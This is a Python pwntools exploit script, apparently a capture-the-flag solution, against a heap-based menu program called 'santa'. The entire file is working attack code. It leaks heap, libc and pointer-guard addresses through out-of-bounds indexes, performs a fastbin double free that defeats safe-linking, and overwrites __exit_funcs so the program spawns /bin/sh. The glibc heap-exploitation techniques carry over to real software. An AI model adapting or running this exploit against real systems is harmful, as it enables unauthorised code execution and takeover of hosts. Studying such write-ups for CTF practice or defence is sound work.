#!/usr/bin/env python3

from pwn import *

exe = ELF("./santa_patched")
libc = ELF("./libc.so.6")

context.binary = exe


def encrypt(pos, ptr):
    return (pos >> 12) ^ ptr

def decrypt(val):
    mask = 0xFFF << 52
    while mask:
        v = val & mask
        val ^= v >> 12
        mask >>= 12
    return val

def ptr_mangle(val, key):
    enc = val ^ key
    r_bits = 0x11
    max_bits = 64
    return (enc << r_bits % max_bits) & (2**max_bits - 1) | (
        (enc & (2**max_bits - 1)) >> (max_bits - (r_bits % max_bits))
    )


def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("localhost", 8000)

    return p


def add(p, idx, size, data):
    p.sendline(b"1")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.sendline(data)


def free(p, idx):
    p.sendline(b"2")
    p.sendline(str(idx).encode())


def read(p, idx):
    p.clean()
    p.sendline(b"3")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Christmas is")
    p.recvline()
    return p.recvline()


def main():
    p = conn()

    # overwrite limit
    add(p, -4, 0x10, b"asdf")

    # leak heap base
    p.clean()
    p.sendline(b"3")
    p.sendline(b"-1")
    p.recvuntil(b"underneath 0 and ")
    heap_base = int(p.recvline()) - 0x29f
    print(hex(heap_base))

    # leak libc base
    add(p, 0, 0x2000, b"libc leak")
    add(p, 1, 0x10, b"asdf")
    free(p, 0)
    p.clean()
    payload = flat(b"3" + b"\x00" * 7, heap_base + 0x2c0)
    p.sendline(payload)
    p.sendline(b"11")
    p.recvuntil(b"Christmas is")
    p.recvline()
    libc_base = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x219ce0
    libc.address = libc_base
    print(hex(libc_base))
    add(p, 0, 0x2000, b"reclaim to avoid fragmentation")

    # leak guard ptr
    p.clean()
    payload = flat(b"3" + b"\x00" * 7, libc_base - 0x2890)
    p.sendline(payload)
    p.sendline(b"11")
    p.recvuntil(b"Christmas is")
    p.recvline()
    guard_ptr = u64(p.recvline().strip().ljust(8, b"\x00"))
    print(hex(guard_ptr))
    system = ptr_mangle(libc.sym.system, guard_ptr)

    # double free detected in tcache 2
    for i in range(7):
        add(p, i, 0x30, b"double free detected in tcache 2")

    add(p, 7, 0x30, b"victim")

    # double free or corruption (fasttop)
    add(p, 8, 0x30, b"double free or corruption")

    for i in range(9):
        free(p, i)

    # double free
    payload = flat(b"2" + b"\x00" * 7, heap_base + 0x24b0)
    p.sendline(payload)
    p.sendline(b"11")

    # clear tcache
    for i in range(7):
        add(p, i, 0x30, b"asdf")

    # attack victim
    payload = flat(encrypt(heap_base + 0x24b0, libc_base + 0x21af00))
    print(payload)
    add(p, 8, 0x30, payload)

    add(p, 9, 0x30, b"asdf")
    add(p, 9, 0x30, b"asdf")

    # overwrite __exit_funcs
    payload = flat(0, 1, 4, system, next(libc.search(b"/bin/sh\x00")))
    add(p, 9, 0x30, payload)

    p.clean()
    p.sendline(b"4")
    p.interactive()


if __name__ == "__main__":
    main()
